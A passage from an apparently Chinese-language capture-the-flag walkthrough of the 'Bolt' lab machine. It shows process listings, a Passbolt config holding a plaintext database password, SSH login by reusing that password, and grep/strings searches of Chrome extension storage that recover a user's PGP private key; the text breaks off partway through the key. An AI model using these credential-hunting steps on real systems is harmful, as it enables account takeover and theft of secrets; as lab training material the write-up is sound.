04:30:01 [36;1mCMD: UID=33   PID=1854   | /bin/sh -c python3 /tmp/a.py [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=129  PID=1782   | dovecot/auth [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1390   | php-fpm: pool www                                                             [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=129  PID=1384   | dovecot/stats [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1347   | gpg-agent --homedir /var/lib/passbolt/.gnupg --use-standard-socket --daemon [0m</span><br><span class="line">2022/01/30 04:30:01 [31;1mCMD: UID=128  PID=1251   | qmgr -l -t unix -u [0m</span><br><span class="line">2022/01/30 04:30:01 [31;1mCMD: UID=128  PID=1250   | pickup -l -t unix -u -c [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=1249   | /usr/lib/postfix/sbin/master -w [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1016   | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=1      | /sbin/init splash [0m</span><br></pre></td></tr></table></figure>

<p>注意到<code>gpg-agent --homedir /var/lib/passbolt/.gnupg --use-standard-socket --daemon</code>,好像是跟密钥管理有关的</p>
<p><code>find /* | grep -i passbolt &gt; /dev/shm/find</code></p>
<p>主要有以下三个目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/passbolt/</span><br><span class="line">/usr/share/php/passbolt/</span><br><span class="line">/var/lib/passbolt/</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301941995.png"></p>
<p><code>/etc/passbolt/passbolt.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;App&#x27;</span> =&gt; [</span><br><span class="line">        <span class="comment">// A base URL to use for absolute links.</span></span><br><span class="line">        <span class="comment">// The url where the passbolt instance will be reachable to your end users.</span></span><br><span class="line">        <span class="comment">// This information is need to render images in emails for example</span></span><br><span class="line">        <span class="string">&#x27;fullBaseUrl&#x27;</span> =&gt; <span class="string">&#x27;https://passbolt.bolt.htb&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Database configuration.</span></span><br><span class="line">    <span class="string">&#x27;Datasources&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;default&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;passbolt&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;rT2;jW7&lt;eY8!dX8&#125;pQ8%&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;passboltdb&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Email configuration.</span></span><br><span class="line">    <span class="string">&#x27;EmailTransport&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;default&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">587</span>,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">            <span class="comment">// Is this a secure connection? true if yes, null if no.</span></span><br><span class="line">            <span class="string">&#x27;tls&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="comment">//&#x27;timeout&#x27; =&gt; 30,</span></span><br><span class="line">            <span class="comment">//&#x27;client&#x27; =&gt; null,</span></span><br><span class="line">            <span class="comment">//&#x27;url&#x27; =&gt; null,</span></span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;Email&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;default&#x27;</span> =&gt; [</span><br><span class="line">            <span class="comment">// Defines the default name and email of the sender of the emails.</span></span><br><span class="line">            <span class="string">&#x27;from&#x27;</span> =&gt; [<span class="string">&#x27;localhost@bolt.htb&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>],</span><br><span class="line">            <span class="comment">//&#x27;charset&#x27; =&gt; &#x27;utf-8&#x27;,</span></span><br><span class="line">            <span class="comment">//&#x27;headerCharset&#x27; =&gt; &#x27;utf-8&#x27;,</span></span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;passbolt&#x27;</span> =&gt; [</span><br><span class="line">        <span class="comment">// GPG Configuration.</span></span><br><span class="line">        <span class="comment">// The keyring must to be owned and accessible by the webserver user.</span></span><br><span class="line">        <span class="comment">// Example: www-data user on Debian</span></span><br><span class="line">        <span class="string">&#x27;gpg&#x27;</span> =&gt; [</span><br><span class="line">            <span class="comment">// Main server key.</span></span><br><span class="line">            <span class="string">&#x27;serverKey&#x27;</span> =&gt; [</span><br><span class="line">                <span class="comment">// Server private key fingerprint.</span></span><br><span class="line">                <span class="string">&#x27;fingerprint&#x27;</span> =&gt; <span class="string">&#x27;59860A269E803FA094416753AB8E2EFB56A16C84&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;public&#x27;</span> =&gt; CONFIG . DS . <span class="string">&#x27;gpg&#x27;</span> . DS . <span class="string">&#x27;serverkey.asc&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;private&#x27;</span> =&gt; CONFIG . DS . <span class="string">&#x27;gpg&#x27;</span> . DS . <span class="string">&#x27;serverkey_private.asc&#x27;</span>,</span><br><span class="line">            ],</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;registration&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;public&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;ssl&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;force&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">        ]</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302133323.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PGP MESSAGE-----</span><br><span class="line">Version: OpenPGP.js v4.10.9</span><br><span class="line">Comment: https://openpgpjs.org</span><br><span class="line"></span><br><span class="line">wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc</span><br><span class="line">g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY</span><br><span class="line">pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H</span><br><span class="line">oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px</span><br><span class="line">l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R</span><br><span class="line">zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp</span><br><span class="line">edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u</span><br><span class="line">l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt</span><br><span class="line">oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7</span><br><span class="line">FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov</span><br><span class="line">8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey</span><br><span class="line">5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY</span><br><span class="line">NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a</span><br><span class="line">Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs</span><br><span class="line">nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6</span><br><span class="line">TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984</span><br><span class="line">=P38i</span><br><span class="line">-----END PGP MESSAGE-----</span><br></pre></td></tr></table></figure>

<p>得到一个用加密后的信息,发送人为<code>eddie</code>,将该文件保存为<code>file.enc</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301943343.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301947641.png"></p>
<p><code>eddie@bolt.htb</code>的pgp公钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><br><span class="line">Version: OpenPGP.js v4.10.9</span><br><span class="line">Comment: https://openpgpjs.org</span><br><span class="line"></span><br><span class="line">xsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi</span><br><span class="line">fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk</span><br><span class="line">cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU</span><br><span class="line">RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU</span><br><span class="line">+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a</span><br><span class="line">If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB</span><br><span class="line">AAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC</span><br><span class="line">YDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE</span><br><span class="line">30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ</span><br><span class="line">HmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8</span><br><span class="line">wBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD</span><br><span class="line">Cm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM</span><br><span class="line">WZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6</span><br><span class="line">OUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4</span><br><span class="line">U8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox</span><br><span class="line">oBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc</span><br><span class="line">oOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt</span><br><span class="line">vK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1</span><br><span class="line">lXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC</span><br><span class="line">UmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c</span><br><span class="line">tEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE</span><br><span class="line">30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z</span><br><span class="line">5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8</span><br><span class="line">IOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc</span><br><span class="line">PyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC</span><br><span class="line">/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg</span><br><span class="line">pmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1</span><br><span class="line">tD0sGGFpQMsI+Q==</span><br><span class="line">=+pbw</span><br><span class="line">-----END PGP PUBLIC KEY BLOCK-----</span><br></pre></td></tr></table></figure>

<p>将该文件保存为<code>eddie.pub</code></p>
<p><code>clark@bolt.htb</code>的pgp公钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><br><span class="line">Version: OpenPGP.js v4.10.9</span><br><span class="line">Comment: https://openpgpjs.org</span><br><span class="line"></span><br><span class="line">xsBNBGA4GX0BCAD2MdBV19tAu+SWkMJ0BkvGdQrLquHg1olUvvhvIWmmBICr</span><br><span class="line">eA89HnYYKFoOxnCL1yhpArtf379rFTZJDXzbzXlnCvgZzP71MNYo2Pq3l0Zn</span><br><span class="line">syfx3juIg+Fr6YYv7RotnpNaz+xFU+eHVSFRl64o+WhuxETPyJKqpRGGYjrl</span><br><span class="line">WiQQP8oCGSh5ytXqK/XRswETTQEQUTkeWHVU5UV6KlYp+xL0vmu8R9UAkcrK</span><br><span class="line">Go9QusV+v4i3PMsgHexuOFHXVJ5nmyGvVQ5khNtuNHruQ5M3xjsb8FtklIo1</span><br><span class="line">asfbjJETUti0wYf7lOffU3+0win4uDbMDOUJEU1ZV//Z+OZq+ARBWaahABEB</span><br><span class="line">AAHNH0NsYXJrIEdyaXN3b2xkIDxjbGFya0Bib2x0Lmh0Yj7CwI0EEAEIACAF</span><br><span class="line">AmA4GX0GCwkHCAMCBBUICgIEFgIBAAIZAQIbAwIeAQAhCRBY7n73qDZg6hYh</span><br><span class="line">BA0fEAb51vFT6RQogFjufveoNmDqjx8IAI+HW1qYWqFhO5VdgDjZLlyFzQgh</span><br><span class="line">CPMjix05N8U6umsy31m0U8OaDCwN+s0S5DAz0e5OSJEF/gNVM/iTP8Ac+gwo</span><br><span class="line">H2kIEUZ6cPMLgV1kwiGAQUr/Fn0biCmKQo36luQphSdT1Gbv+fOpcrLFh+bZ</span><br><span class="line">EndJIgKdovUrr3eo7gyJhALzrYz9PinypoQPs6t3PXKbRWdhHulQuBZPUavH</span><br><span class="line">2g6knhGnx8P2XGEbELGh2NmmB9K1B9vpjxpGokZGiVXAA00/T4rj22/fXHJO</span><br><span class="line">XXFzSjoIpnPCjBozgeWtiwDwD5zFh4rg7NkcyZFwg2BZo3fFKXBENWlOIy9b</span><br><span class="line">ejRn7ea1iTbK4BLOwE0EYDgZfQEIALhlzquF2jgQJkBFUC0PvpaYBNMtinA5</span><br><span class="line">SiA+rKMs+qhsfJf9whelroGL4znwOw4yI+gCIdiX+qlGyxPD1LXVCHWyaTA3</span><br><span class="line">fiivImGkEXV2pP3CvBjtzsYv4g9rlrXmoOrhwnhJUxcq/0D8HinpbIwQ8euM</span><br><span class="line">jTCfLVCBPOLham/D/j7QLydZ0flA+z3SKJMrbx5MlhlGj2PwxWdOLII7xTol</span><br><span class="line">1B7F5WUz/ILKhCkzSliiRAHJhQNlgZHV3bCHGR1YUDf30pvn9GEwbOE2DdUv</span><br><span class="line">K9Mvu5Ow5PLC+EHv1Ve21bfKTE8sQbkhF7qaxoX3C47DReze7LGidk+DIPJx</span><br><span class="line">Gw2JeW/EukUAEQEAAcLAdgQYAQgACQUCYDgZfQIbDAAhCRBY7n73qDZg6hYh</span><br><span class="line">BA0fEAb51vFT6RQogFjufveoNmDqkwgH/Aup4vqEXUxqciTyIZUDctPY1I2v</span><br><span class="line">dwcMS1J9sjW8UOy3XzkgG2+ysME09fzODTM/zwpGEQf8icUvMOq70NMeUDed</span><br><span class="line">BnnVHlgwgn4W10xh8p6z24yBrU0iwRianGMX9bIzToHkxwhaj8AtQP5cXoZi</span><br><span class="line">x8/MFj+LswTfZDAP10CkgS4L3bsi7nIrh3sHMPjn2RYLIVXffWTDC4TJ2HV5</span><br><span class="line">IadG59FrSdK+n8vXPNPcYUcm1F6ddDGvsxjBNwCX00jDNL3Gp7fPqKQjQCh0</span><br><span class="line">pMIO+51kn9QRJJP/XmJrOw2mTheT20DT26JX/K947oi/pAe8xGHrCKAqWiZ5</span><br><span class="line">AeAgt0l0AiCdPTQ=</span><br><span class="line">=axZz</span><br><span class="line">-----END PGP PUBLIC KEY BLOCK-----</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302007780.png"></p>
<p>得到<code>passbolt</code>的PGP公钥和私钥,还从数据库中得到两个公钥,但缺少eddie的私钥,无法对得到的密文进行解密</p>
<p>试试用已知的密码去登录ssh</p>
<p>成功以<code>eddie:rT2;jW7&lt;eY8!dX8&#125;pQ8%</code>登录ssh</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302014659.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302016761.png"></p>
<p>注意到登录提示<code>You have mail.</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find /* | grep -i mail</span><br><span class="line">/var/mail</span><br><span class="line">/var/mail/eddie</span><br><span class="line">/var/mail/www-data</span><br><span class="line">/var/mail/root</span><br><span class="line">/var/mail/test</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">eddie@bolt:/var/mail$ ls -alh</span><br><span class="line">total 24K</span><br><span class="line">drwxrwsr-x  3 root     mail 4.0K Jan 30 03:03 .</span><br><span class="line">drwxr-xr-x 14 root     root 4.0K Jan 26 07:14 ..</span><br><span class="line">-rw-------  1 eddie    mail  909 Feb 25  2021 eddie</span><br><span class="line">-rw-------  1 root     mail    1 Mar  3  2021 root</span><br><span class="line">drwx--S---  5     5001 mail 4.0K Jan 30 03:04 test</span><br><span class="line">-rw-------  1 www-data mail    1 Mar  3  2021 www-data</span><br><span class="line">eddie@bolt:/var/mail$ cat eddie </span><br><span class="line">From clark@bolt.htb  Thu Feb 25 14:20:19 2021</span><br><span class="line">Return-Path: &lt;clark@bolt.htb&gt;</span><br><span class="line">X-Original-To: eddie@bolt.htb</span><br><span class="line">Delivered-To: eddie@bolt.htb</span><br><span class="line">Received: by bolt.htb (Postfix, from userid 1001)</span><br><span class="line">        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)</span><br><span class="line">Subject: Important!</span><br><span class="line">To: &lt;eddie@bolt.htb&gt;</span><br><span class="line">X-Mailer: mail (GNU Mailutils 3.7)</span><br><span class="line">Message-Id: &lt;20210225212019.DFF264CD@bolt.htb&gt;</span><br><span class="line">Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)</span><br><span class="line">From: Clark Griswold &lt;clark@bolt.htb&gt;</span><br><span class="line"></span><br><span class="line">Hey Eddie,</span><br><span class="line"></span><br><span class="line">The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.</span><br><span class="line">Once you&#x27;re set up you can start importing your passwords.  Please be sure to keep good security in mind - there&#x27;s a few things I read about in a security whitepaper that are a little concerning...</span><br><span class="line"></span><br><span class="line">-Clark</span><br></pre></td></tr></table></figure>

<p><code>Clark</code>给<code>Eddie</code>发了一封邮件,提示存在私钥备份</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密码管理服务器已启动并正在运行。 继续将扩展程序下载到您的浏览器并登录。请务必备份您的私钥，因为我无法恢复它。 您的私钥是恢复您的帐户的唯一方法。</span><br><span class="line">设置完成后，您就可以开始导入密码了。 请务必牢记良好的安全性 - 我在安全白皮书中读到的一些内容有点令人担忧...... </span><br></pre></td></tr></table></figure>

<p>结合前面找到的<code>/opt/google/chrome/chrome-sandbox</code>,推测要在<code>chrome</code>的扩展程序的缓存中寻找私钥</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302035398.png"></p>
<p>应该在<code>~/.config/google-chrome/Default</code>目录下,运行<code>rep -r -i -a -s &quot;PGP PRIVATE KEY BLOCK&quot; *</code></p>
<p>主要在<code>Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/</code>下的一些js文件和<code>Local Extension Settings/didegimhafipceonhjepacocaffmoppf/</code>下的一个log文件,重点应该放在这个log文件中</p>
<p><code>strings 000003.log | grep -i &quot;PGP PRIVATE KEY BLOCK&quot;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302054097.png"></p>
<p>从文件提取出私钥,保存为<code>eddie.key</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PGP PRIVATE KEY BLOCK-----</span><br><span class="line">Version: OpenPGP.js v4.10.9</span><br><span class="line">Comment: https://openpgpjs.org</span><br><span class="line"></span><br><span class="line">xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi</span><br><span class="line">fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk</span><br><span class="line">cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU</span><br><span class="line">RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU</span><br><span class="line">+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a</span><br><span class="line">If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB</span><br><span class="line">AAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW</span><br><span class="line">UjeGmI+w7iQ+WYFlmjFN/Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y+Fhua</span><br><span class="line">jS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C/Rsyqd0BYXXA</span><br><span class="line">iOe++biDBB6v/pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac</span><br><span class="line">2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk+ZAxd2rJhhleZDiASDrIDT9/G5FDVj</span><br><span 